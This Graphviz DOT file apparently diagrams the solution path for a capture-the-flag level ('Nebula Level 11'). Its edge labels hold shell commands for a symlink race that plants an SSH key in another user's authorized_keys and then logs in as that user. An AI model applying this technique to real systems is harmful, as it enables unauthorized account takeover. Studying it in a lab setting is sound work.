digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Nebula Level 11"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Predictable temp path identified"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Authorized_keys target prepared"];
  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Symlink race performed"];
  node3 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Execution as flag11 obtained"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="cat /home/flag11/flag11.c"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="ssh-keygen -t rsa -N \"\" -f /tmp/flag11key"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="ln -sf /home/flag11/.ssh/authorized_keys /tmp/<predicted-tempfile>"];
  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="ssh -i /tmp/flag11key -o StrictHostKeyChecking=no flag11@localhost"];
}
